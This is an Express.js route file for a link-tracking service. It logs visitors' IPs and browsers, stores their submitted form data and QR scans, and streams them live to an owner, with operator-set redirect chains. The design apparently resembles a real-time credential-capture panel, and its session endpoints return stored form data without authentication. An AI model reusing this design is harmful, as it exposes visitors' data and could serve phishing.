// ============================================================
// MEGA TOOLS — DATA TRACKING ROUTES (ENTERPRISE v6.6)
// FIXED v6.6: Per-record indexed queries — no full collection reads
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate } = require('../middleware/auth');
const { toStringId, parseTrackingCode, now } = require('../utils/helpers');
const sessionManager = require('../services/sessionManager');

let ioInstance = null;
function setIO(io) { ioInstance = io; }
function getIO() { return ioInstance; }

function normalizeIP(ip) {
  if (!ip) return 'unknown';
  if (ip.startsWith('::ffff:')) return ip.replace('::ffff:', '');
  if (ip === '::1') return '127.0.0.1';
  return ip;
}

let cachedUsers = null;
let userCacheTime = 0;
const USER_CACHE_TTL = 30000;

async function getCachedUsers() {
  if (!cachedUsers || Date.now() - userCacheTime > USER_CACHE_TTL) {
    cachedUsers = await db.users.read();
    userCacheTime = Date.now();
  }
  return cachedUsers;
}

async function findLinkBySlug(slug) {
  if (!slug) return null;
  const all = await db.links.read();
  return all.find(l => l.baseCode === slug || l.slug === slug || l.uniqueCode === slug || l.redirectCode === slug) || null;
}

async function getChainTargetUrl(link, identity, actionCode) {
  if (!link || !link.is_chain || !link.chain_links?.length) {
    return { url: link?.baseUrl || 'about:blank', chainStep: null, chainStepName: '' };
  }
  if (actionCode) {
    const stepIndex = link.chain_links.findIndex(cl => cl.actionCode === actionCode);
    if (stepIndex >= 0) {
      return { url: link.chain_links[stepIndex].url, chainStep: stepIndex, chainStepName: link.chain_links[stepIndex].name || '' };
    }
  }
  const nextUrl = await Link.getNextChainUrl(link, identity);
  return { url: nextUrl?.url || link.chain_links[0].url, chainStep: nextUrl?.index ?? 0, chainStepName: nextUrl?.name || link.chain_links[0].name || '' };
}

function buildSessionDelta(session, type) {
  return {
    type, timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
    },
  };
}

function emitToOwnerRoom(io, trackingCode, event, data) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  io.to('room_' + ownerCode).emit(event, data);
}

async function emitSessionEvents(io, session, isNew, link) {
  if (!io) return;
  const tc = session.trackingCode || '';
  const ownerCode = tc.includes('_') ? tc.split('_')[0] : tc;
  if (ownerCode) {
    io.to('room_' + ownerCode).emit('sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
  }
  if (session && session._id) {
    io.to('room_' + ownerCode).emit('sessionClick', { sessionId: session._id, clicks: session.clicks || 1, timestamp: now() });
  }
  if (link && isNew) { await Link.incrementClicks(link._id); }
}

function getClientIdentity(req) {
  const rawIP = req.body.ip || req.ip || '::1';
  return {
    visitorId: req.body.visitorId || req.query.visitorId || req.query.vid || null,
    ip: normalizeIP(rawIP)
  };
}

// ============================================================
// SMART REDIRECT (GET /:code)
// ============================================================

router.get('/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = trackingCode || link?.ownerTrackingCode || code;
    const baseCode = slug || code;
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: code, collectedTypes: ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    sessionManager.updateEvidence(session._id, 'user_activity');
    const io = getIO(); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false, redirectDelay: 1000 });
  } catch (err) { console.error('[Data] GET /:code error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CLICK TRACKING
// ============================================================

router.get('/click/:code', async (req, res) => {
  try {
    const { visitorId, ip } = getClientIdentity(req);
    const ua = req.headers['user-agent'] || '';
    const { trackingCode, slug, actionCode } = parseTrackingCode(req.params.code);
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = trackingCode || link?.ownerTrackingCode || req.params.code;
    const baseCode = slug || req.params.code;
    let targetUrl = link?.baseUrl || 'about:blank'; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: ua.substring(0, 500), deviceType: /mobile/i.test(ua) ? 'Mobile' : 'Desktop', entryUrl: baseCode, currentUrl: req.params.code, collectedTypes: ['click'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    sessionManager.updateEvidence(session._id, 'user_activity');
    const io = getIO(); await emitSessionEvents(io, session, isNew, link);
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Click error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// CHECK REDIRECT — ✅ FIXED v6.6: indexed findOne
// ============================================================

router.get('/check-redirect/:code', async (req, res) => {
  try {
    const { code } = req.params;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode, slug } = parseTrackingCode(code);
    
    // ✅ v6.6: findOne indexed query — not full read
    let session = null;
    if (visitorId) {
      session = await db.sessions.findOne({ visitorId, isLive: true, hiddenForAll: false });
    }
    if (!session && trackingCode) {
      session = await db.sessions.findOne({ trackingCode, isLive: true, hiddenForAll: false });
    }
    
    if (session) { 
      sessionManager.updateEvidence(session._id, 'polling');
      const link = await findLinkBySlug(slug);
      let redirectUrl = session.currentUrl || link?.baseUrl || '';
      if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, visitorId || ip, null); redirectUrl = chainResult.url; }
      res.json({ success: true, redirectUrl, session, message: session.lastMessage || '' }); 
    } else {
      res.json({ success: false, redirectUrl: null, message: null });
    }
  } catch (err) { console.error('[Data] Check redirect error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// VISIT (POST)
// ============================================================

router.post('/visit', async (req, res) => {
  try {
    const { trackingCode, browser, device, collectedTypes } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const { trackingCode: parsedTC, slug, actionCode } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = parsedTC || trackingCode || 'unknown';
    const baseCode = slug || trackingCode || 'direct_visit';
    let targetUrl = link?.baseUrl || ''; let chainStep = null; let chainStepName = '';
    const identity = visitorId || ip;
    if (link?.is_chain) { const chainResult = await getChainTargetUrl(link, identity, actionCode); targetUrl = chainResult.url; chainStep = chainResult.chainStep; chainStepName = chainResult.chainStepName; }
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: browser || '', deviceType: device || 'Desktop', entryUrl: baseCode, currentUrl: trackingCode || '', collectedTypes: collectedTypes || ['visit'], chainId: link?.is_chain ? toStringId(link._id) : null, chainStep, chainStepName });
    sessionManager.updateEvidence(session._id, 'user_activity');
    const io = getIO(); await emitSessionEvents(io, session, isNew, link);
    if (io && session) {
      emitToOwnerRoom(io, finalTrackingCode, 'sessionClick', { sessionId: session._id, clicks: session.clicks || 1, timestamp: now() });
    }
    res.json({ success: true, session, targetUrl, chainStep, chainStepName, isChain: link?.is_chain || false });
  } catch (err) { console.error('[Data] Visit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// FORM SUBMIT — Room-based emit
// ============================================================

router.post('/submit', async (req, res) => {
  try {
    const { formData, trackingCode, collectedTypes, browser, device } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    if (!formData) return res.status(400).json({ success: false, message: 'formData required' });
    const { trackingCode: parsedTC, slug } = parseTrackingCode(trackingCode || '');
    const link = await findLinkBySlug(slug);
    const finalTrackingCode = parsedTC || trackingCode || 'direct';
    const baseCode = slug || trackingCode || 'direct_submit';
    const enrichedFormData = { ...formData, submittedAt: now() };
    const { session, isNew } = await Session.upsert({ visitorId, baseCode, trackingCode: finalTrackingCode, linkId: link ? toStringId(link._id) : null, ip, browser: browser || 'Unknown', deviceType: device || 'Desktop', entryUrl: baseCode, currentUrl: trackingCode || '', collectedTypes: [...(collectedTypes || []), 'form_submit'], chainId: link?.is_chain ? toStringId(link._id) : null, formData: enrichedFormData });
    sessionManager.updateEvidence(session._id, 'user_activity');
    const io = getIO();
    if (io) {
      emitToOwnerRoom(io, finalTrackingCode, 'sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
      emitToOwnerRoom(io, finalTrackingCode, 'formSubmitted', { visitorId: session.visitorId, sessionId: session._id, trackingCode: finalTrackingCode, formData: enrichedFormData, timestamp: now() });
    }
    res.json({ success: true, message: 'Form submitted', session, totalSubmissions: session.submissions?.length || 1 });
  } catch (err) { console.error('[Data] Submit error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// HEARTBEAT — Evidence update only
// ============================================================

router.post('/heartbeat', async (req, res) => {
  try {
    const { trackingCode, browser, device, status } = req.body;
    const { visitorId, ip } = getClientIdentity(req);
    const { session } = await Session.upsert({ visitorId: visitorId || null, trackingCode: trackingCode || '', baseCode: '', ip, browser: browser || '', deviceType: device || 'Desktop', collectedTypes: ['heartbeat'], status: status || undefined });
    if (session) {
      session.lastActivity = new Date().toISOString();
      sessionManager.updateEvidence(session._id, 'heartbeat');
      const io = getIO();
      if (io) {
        const ownerCode = (session.trackingCode || '').includes('_') ? session.trackingCode.split('_')[0] : session.trackingCode;
        if (ownerCode) {
          io.to('room_' + ownerCode).emit('sessionHeartbeat', { sessionId: session._id, status: session.status, isLive: session.isLive, timestamp: now() });
        }
      }
    }
    res.json({ success: true, isLive: session?.isLive, status: session?.status, lastActivity: session?.lastActivity });
  } catch (err) { console.error('[Data] Heartbeat error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

// ============================================================
// SCANNER QR VERIFY — ✅ FIXED v6.6: indexed findOne
// ============================================================

router.post('/verify-scan', async (req, res) => {
  try {
    const { qrData, trackingCode, visitorId } = req.body;
    if (!qrData || !trackingCode) {
      return res.status(400).json({ success: false, message: 'QR data and tracking code required' });
    }
    const { visitorId: clientVid, ip } = getClientIdentity(req);
    const finalVisitorId = visitorId || clientVid || ip;
    const finalTrackingCode = trackingCode || 'unknown';

    // ✅ v6.6: findOne indexed query — not full read
    let session = await db.sessions.findOne({ visitorId: finalVisitorId, isLive: true, hiddenForAll: false });

    if (session) {
      session.verified = true;
      session.qrData = qrData;
      session.verifiedAt = now();
      session.lastActivity = new Date().toISOString();
      await db.sessions.updateOne(session._id, session);
    } else {
      const { session: newSession } = await Session.upsert({
        visitorId: finalVisitorId,
        trackingCode: finalTrackingCode,
        baseCode: 'qr_scan',
        ip,
        browser: req.headers['user-agent']?.substring(0, 300) || '',
        deviceType: /mobile/i.test(req.headers['user-agent'] || '') ? 'Mobile' : 'Desktop',
        collectedTypes: ['qr_verify'],
        verified: true,
        qrData: qrData,
        verifiedAt: now()
      });
      session = newSession;
    }

    const io = getIO();
    if (io && finalTrackingCode) {
      const ownerCode = finalTrackingCode.includes('_') ? finalTrackingCode.split('_')[0] : finalTrackingCode;
      io.to('room_' + ownerCode).emit('scanVerified', { visitorId: finalVisitorId, sessionId: session._id, qrData: qrData, trackingCode: finalTrackingCode, timestamp: now() });
      io.to('room_' + ownerCode).emit('sessionDelta', buildSessionDelta(session, 'updated'));
    }
    res.json({ success: true, message: 'QR Verified', sessionId: session._id, verified: true });
  } catch (err) {
    console.error('[Data] Verify scan error:', err);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// SESSION DETAILS
// ============================================================

router.get('/session/:visitorId', async (req, res) => {
  try {
    const session = await Session.findByVisitorId(req.params.visitorId);
    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
    res.json({ success: true, session });
  } catch (err) { console.error('[Data] Session error:', err); res.status(500).json({ success: false, message: 'Server error' }); }
});

module.exports = router;
module.exports.setIO = setIO;
module.exports.getIO = getIO;